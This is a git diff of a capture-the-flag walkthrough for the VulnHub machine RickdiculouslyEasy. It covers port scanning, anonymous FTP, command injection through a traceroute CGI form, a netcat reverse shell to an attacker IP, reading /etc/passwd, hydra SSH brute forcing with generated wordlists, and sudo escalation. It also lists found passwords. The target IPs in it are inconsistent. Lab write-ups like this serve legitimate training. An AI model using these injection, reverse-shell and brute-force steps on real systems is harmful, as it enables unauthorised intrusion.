@@ -1,230 +1,186 @@
-RICKDICULOUSLYEASY #1 Write Up
-https://www.vulnhub.com/entry/rickdiculouslyeasy-1,207/
+Source: https://www.vulnhub.com/entry/rickdiculouslyeasy-1,207/  
+Target: 10.0.0.26  
+Diffuculty: Easy
 
-This CTF works on getting to 130 points, so we need to find every flag until it adds up to 130.
+*In order to complete this CTF we must get all 130 points, so we need to find every flag until it adds up to 130.**
 
-Step 1: NMAP
-POINTS = 0
+## NMAP
 
-Starting with the nmap command to identify the ip and open ports of the target machine.
-nmap -sS -sV -p- 10.0.0.24
+> nmap -sS -sV -p- 10.0.0.24
 
-Nmap scan report for 10.0.0.22
-Host is up (0.00010s latency).
-Not shown: 65528 closed tcp ports (reset)
-PORT      STATE SERVICE VERSION
-21/tcp    open  ftp     vsftpd 3.0.3
-22/tcp    open  ssh?
-80/tcp    open  http    Apache httpd 2.4.27 ((Fedora))
-9090/tcp  open  http    Cockpit web service 161 or earlier
-13337/tcp open  unknown
-22222/tcp open  ssh     OpenSSH 7.5 (protocol 2.0)
-60000/tcp open  unknown
+![image](https://user-images.githubusercontent.com/76552238/157470893-78ec3c9d-034e-4926-9e81-924f2b068ce2.png)
 
-Step 2: PORT 21 | FTP 
-POINTS = 0
+The NMAP scan shows there are 7 open ports.
+## FTP 
 
-Since we don't a user and password we can't log into FTP, but if enabled there is an option
-in FTP whiche allows to enter as an anonymous user and thuse requires no password.
+Since we have any credentials, we can't log into FTP, but if enabled there is an option
+in FTP which allows to enter as an anonymous user and thuse requires no password.
+
+> ftp 10.0.0.26
+
+![image](https://user-images.githubusercontent.com/76552238/157472285-0b0f0b93-8488-45b2-9497-b9ce2579cb64.png)
+
+![image](https://user-images.githubusercontent.com/76552238/157472418-8977783d-6734-47ac-a750-87a14eea9baa.png)
+
 And It Worked...
 We can get our first flag.
 
 FLAG{Whoa this is unexpected} - 10 Points
 
-Step 3: PORT 22 | SSH?
-POINTS = 10
+The directory 'pub' is empty.
 
-After using NMAP to find open ports on our target, we get a question mark next to the SSH protocol on port 22.
-This means there is something other then SSH running on this port, we get an error beacuse port 22 is usually saved 
-for the SSH protocol, and so we can't use SSH on port 22.
-But we can see that SSH is also running on port 22222 with no qustion mark, this probebly means that this port 
-is running the SSH protocol.
+## PORT 13337
 
-Before going into HTTP let's try some other odd ports.
+NMAP doesn't tell us what service is running on this port, but we can access it using the 'telnet' command.
 
-Step 4: PORT 13337
-POINTS = 20
+> telnet 10.0.0.26 13337
 
-Port 13337 is not a very common port and so it must have something interting behind it.
-Using telnet to find more information about this port...
-
-telnet 10.0.0.22 13337
+![image](https://user-images.githubusercontent.com/76552238/157473179-41b9c423-2b27-43db-9e7f-d17b82e36260.png)
 
 We get another flag.
 
-FLAG:{TheyFoundMyBackDoorMorty} - 10 Points
+## PORT 60000
 
-Step 5: PORT 60000
-POINTS = 30
+Same story here.
 
-Once again using telnet to find more information about the port, we suprisingly get this message:
-Welcome to Ricks half baked reverse shell...
-#
+> telnet 10.0.0.26 60000
 
-Using the whoami command we can see that we see that we are the root user and find another FLAG.
+![image](https://user-images.githubusercontent.com/76552238/157473695-25e7fc6d-96f0-41be-b73d-7e34b3002324.png)
 
-FLAG{Flip the pickle Morty!} - 10 Points
+## PORT 9090 | ZEUS ADMIN
 
-Trying to change directory to /root, prompts "Permission Denied" and thuse for every command exepct whoami and ls.
-This means that we are not really the root user and there is nothing more we can do in this reverse shell.
+Port 9090 is running 'zeus-admin'. Going to http://10.0.0.26:9090 it displays another flag.
 
-Step 6: PORT 9090 | ZEUS ADMIN
-POINTS = 40
+![image](https://user-images.githubusercontent.com/76552238/157474248-8a714df9-ba14-4d3a-931c-c5f44fe89a80.png)
 
-NMAP says PORT 9090 is using HTTP
-After googling what PORT 9090 is, it says Zeus is an old web server. It can also be many other TCP based services.
-So going to http://10.0.0.22:9090 
-We get another FLAG:
+## HTTP
 
-FLAG {There is no Zeus, in your face!} - 10 Points
+Going into the http://10.0.0.26, there are no hyperlinks ,no buttons and no comments.
+Let's brute force the directories.
 
-Step 7: PORT 80 | HTTP
-POINTS = 50
+> gobuster dir -u http://10.0.0.26 -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt -x txt
 
-Going into the http://10.0.0.22 we are greeted with a picture of Morty.
-There are no hyperlinks and no buttons and by going into the develpor tools we don't see anything that can help us.
-Using a tool named dirsearch we can know if there are more directorys and files inside the site.
-And indeed there are: 
+![image](https://user-images.githubusercontent.com/76552238/157474957-a14efc55-8748-4dfc-a95a-08836e80751b.png)
 
-/passwords/
-robots.txt
+http://10.0.0.22/passwords/ holds another flag.
 
-Going into http://10.0.0.22/passwords/ we get yet again another flag:
+![image](https://user-images.githubusercontent.com/76552238/157475092-c2ef1acc-b636-407f-a9fa-2810f8d957e3.png)
 
-FLAG{Yeah d- just don't do it.} - 10 Points
+There is also a file called 'passwords.html'.
 
-There is also a passwords.html file that displays:
+![image](https://user-images.githubusercontent.com/76552238/157475217-a27a9046-c927-4845-a1e8-1b31fc897e1c.png)
 
-"Wow Morty real clever. Storing passwords in a file called passwords.html? 
-You've really done it this time Morty. Let me at least hide them.. I'd delete them entirely but I know you'd go bitching to your mom. 
-That's the last thing I need."
+There is a comment that holds a password.
 
-Using develepor tools get a comment:
+![image](https://user-images.githubusercontent.com/76552238/157475412-b3f2cf52-e710-4722-ab7c-2f4ac88211fd.png)
 
-<!--Password: winter-->
+http://10.0.0.26/robots.txt has another message from Rick.
 
-Now we got a password, winter.
+![image](https://user-images.githubusercontent.com/76552238/157475606-0aff170a-e571-4926-9a41-5d157e9dcd32.png)
 
-Going into http://10.0.0.22/robots.txt we get this message:
+The directory 'cgi-bin' in web servers is responsible for executing external programs.
+cgi-bin/root_shell.cgi doesn't have any useful information.
 
-They're Robots Morty! It's ok to shoot them! They're just Robots!
+Going into /cgi/bin/tracertool.cgi we have an input box. When we enter an IP, we get that output of the traceroute command running the machine hosting the web server. Let's see if it is vulnerable to RCE (Remote Command Execution). Let's test this by entering ';', we should be able to run our own commands on the machine.
 
-/cgi-bin/root_shell.cgi
-/cgi-bin/tracertool.cgi
-/cgi-bin/*
+> ; ls -l
 
-We found that the web server has the cgi-bin directory, the cgi-bin folder is responsible for executing an external program.
-By going to /cgi-bin/root_shell.cgi it says its  
+![image](https://user-images.githubusercontent.com/76552238/157477143-db802eb3-afd4-48aa-9707-c80020f36304.png)
 
---UNDER CONSTRUCTION-- 
+## REVERSE SHELL
 
-By using develepor tools we can see 2 comments:
-<!--HAAHAHAHAAHHAaAAAGGAgaagAGAGAGG-->
-<!--I'm sorry Morty. It's a bummer.--> 
+> Local Machine:
 
-We cannot get anything from this program.
+![image](https://user-images.githubusercontent.com/76552238/157477415-23f74864-e050-48c9-afd5-9070b374accd.png)
 
-Going into /cgi/bin/tracertool.cgi we get MORTY'S MACHINE TRACER MACHINE and an input box.
-Typing an IP executes the traceroute command and displays it output.
-We may able to inject some commands into this by trying to use ;.
-Entering "; whoami" outputs "apache", IT WORKS!.
-Now we can try a reverse shell.
+> Target Machine:
 
-Step 8: REVERSE SHELL
-POINTS = 50
+![image](https://user-images.githubusercontent.com/76552238/157477538-6b6fc328-ef26-45f4-9707-dc14a584a21e.png)
 
-Local Machine:
-nc -lnvp 4444
+![image](https://user-images.githubusercontent.com/76552238/157477723-363ef136-5119-49f3-b491-1e1874d30918.png)
 
-Target Machine:
-; nc 10.0.0.18 4444 -e /bin/bash
+Using the "whoami" command we can we are the user 'apache'.
+Trying to use cat to read the /etc/passwd file does not seem to work, instead it prints an ascii banner of a cat.  
 
-And we get a connection, using "whoami" to see what user is running and we get the apache user.
-Trying to use cat to read the /etc/passwd file does not seem to work, instead it prints an ascii banner of a cat, pretty cool 
-but not helpful.
-We can try using the tail or head command, since the users are stored at the bottom of the /etc/passwd file we'll use tail.
-We get another 3 users:
+> cat /etc/passwd | grep /bin/bash
 
-Summer
-Morty
-RickSanchez
+![image](https://user-images.githubusercontent.com/76552238/157488913-66806f98-4057-4084-bf2d-2874d9f49043.png)
 
-Step 9: PORT 22222 | REAL SSH
-POINTS = 50
+We can try using the command 'tail' to read the /etc/passwd file.  
 
-Now that we have a password and some usernames we can try loging to the machine via ssh.
+> tail /etc/passwd | grep /bin/bash
 
-Morty does not seem to work, so is RickSanchez, but we get a connection with Summer.
+![image](https://user-images.githubusercontent.com/76552238/157488819-40a9f850-d2d4-497c-bf38-a53851942b42.png)
 
-ssh Summer@10.0.0.22 -p 
-Summer@10.0.0.22's password: "winter"
+## PORT 22222 | SSH
+
+We can try brute forcing the SSH login using the usernames we found and the password 'winter'.  
+
+> hydra -L users.txt -p '
+' ssh://10.0.0.26:22222 -IV
+
+![image](https://user-images.githubusercontent.com/76552238/157479594-11bbfad7-190a-46d6-86ee-8ad1cddaaf1c.png)
 
 Ah get it , winter summer, never mind.
+After loggin to the machine we can get another flag.
 
-We got another FLAG:
+![image](https://user-images.githubusercontent.com/76552238/157479930-ee530d1e-05ef-4610-bbd3-3de597964c77.png)
 
-FLAG{Get off the high road Summer!} - 10 Points
+Going into the /home folder we see there are 2 more directories, Morty and RickSanchez.
 
-Going into the /home folder we see there are 3 directorys, Morty, RickSanchez and Summer.
-The Morty directory has a .jpg and a zip file.
-Opening the .jpg we see a photo of Rick, nothing on the surface but using the strings command we see an intersting string.
+![image](https://user-images.githubusercontent.com/76552238/157480122-949fb799-5d64-440c-9977-66bca1171833.png)
 
-"The Safe Password: File: /home/Morty/journal.txt.zip. Password: Meeseek"
+The directory 'Morty' has a .jpg and a zip file.
 
-This leads us to the .zip file, to unzip it we must enter a password, entering the found password and we get a .txt file which reads:
+![image](https://user-images.githubusercontent.com/76552238/157480541-efa5800d-20bf-4854-abd4-fee32cc2ea27.png)
 
-Monday: So today Rick told me huge secret. He had finished his flask and was on to commercial grade paint solvent. He spluttered something about a safe, and a password. Or maybe it was a safe password... Was a password that was safe? Or a password to a safe? Or a safe password to a safe?
+We can use the 'strings' command to see if the jpg holds any secret information.
 
-Anyway. Here it is:
+> Strings Safe_Password.jpg
 
-FLAG: {131333} - 20 Points
+![image](https://user-images.githubusercontent.com/76552238/157481400-6e75f9b7-4b62-43fc-8aa8-b7799d072154.png)
 
-The RickSanchez directory contains 2 more directorys, changing to the ThisDoesntContainAnyFlags dir, we find out that
-there are no flags. Suprising. :3
+We can now unzip the zip file.
 
-The second dir is RICKS_SAFE, it contains an exectuable named safe, after attamping to execute it, we find 
-out that we don't have permissions.
+![image](https://user-images.githubusercontent.com/76552238/157481720-18df89ea-2d44-4645-9f39-17b9c8fe7d22.png)
 
-But we can download it to our local machine.
-once executing it we get:
+Let's go to Rick's folder.
 
-"Past Rick to present Rick, tell future Rick to use GOD DAMN COMMAND LINE AAAAAHHAHAGGGGRRGUMENTS!"
+![image](https://user-images.githubusercontent.com/76552238/157482387-2ea3d60c-4a47-4f4c-b1b1-b19523afd291.png)
 
-We found a password eariler in the flag: 131333. If we try to pass the password as an argmuent to ./safe, we get a FLAG.
+The directory 'ThisDoesntContainAnyFlags' suprisingly doesn't have any flag (FOR REAL).
 
-FLAG{And Awwwaaaaayyyy we Go!} - 20 Points 
+![image](https://user-images.githubusercontent.com/76552238/157489833-038b2985-347b-44ff-99e2-893cc62763bb.png)
 
-And this message: 
+The second directory is RICKS_SAFE, it contains an exectuable named safe.
 
-"Ricks password hints:
- (This is incase I forget.. I just hope I don't forget how to write a script to generate potential passwords. Also, sudo is wheely good.)
-Follow these clues, in order
+![image](https://user-images.githubusercontent.com/76552238/157482733-8ce9a526-525b-4627-8c15-f59ce2b55686.png)
 
-1 uppercase character
-1 digit
-One of the words in my old bands name."
+We don't have permissions to execute the script, so let's download it to our local machine.
 
-Step 10: BRUTE FORCE
-POINTS = 100
+![image](https://user-images.githubusercontent.com/76552238/157483158-5c3bef0c-c24d-4736-8fd3-9d89f492a5ef.png)
 
-Searching google for Rick's band, we find that his band's name was "The Flesh Curtains".
-After making a python script that makes a a wordlist with the specified requiremnts:
+Turns out we can pass arguments to the script.
 
-1 uppercase character
-1 digit
-One of the words in my old bands name.
+![image](https://user-images.githubusercontent.com/76552238/157483673-7e869da1-31ce-4fcd-aeb9-c960d6b8ddb4.png)
 
-We can use hydra to brute force with the wordlist and get a password.
-Trying to brute force the root user did not work, but the RickSanchez was a success, the password is:
+In the last flag we found in Morty's directory there was a number. Let's see what happens when we pass it.
 
-P7Curtains
+![image](https://user-images.githubusercontent.com/76552238/157483808-e23e3b34-2a36-4f05-95ad-cfc6e39c106a.png)
 
-Now we the password for RickSanchez and we can log in.
-Using sudo -l to see if we have permissions, and we see that we can have full permissions.
+This message gives a clue into Rick's password. It holds holds 1 uppercase character, 1 number and a string from Rick's band name. Rick's band name is 
+'The Flesh Curtains'. Let's write a simple python script that gives us all the possible combinations.
 
-Step 11: ROOT USER
-Running the "su" as with and we have access to the root user and we read the final FLAG.
+> python Ricks_Password.py > users.txt  
 
-FLAG: {Ionic Defibrillator} - 30 points
+> hydra -l RickSanchez -P passCombinations.txt ssh://10.0.0.26:22222 -IV
+
+![image](https://user-images.githubusercontent.com/76552238/157486812-bade2bb3-c5fd-48dc-b2aa-d0509136aacd.png)
+
+Now that we are logged in the user 'RickSanchez' let's see if he is part of the sudo group.
+
+![image](https://user-images.githubusercontent.com/76552238/157486441-9916f6ac-b832-4d08-af8a-5ba892a7911f.png)
+
+![image](https://user-images.githubusercontent.com/76552238/157486650-deb32134-bb58-4dce-90d8-ec8b5bed23ec.png)
 
 And with 130 points and 0 more to go the CTF is officaily completed.
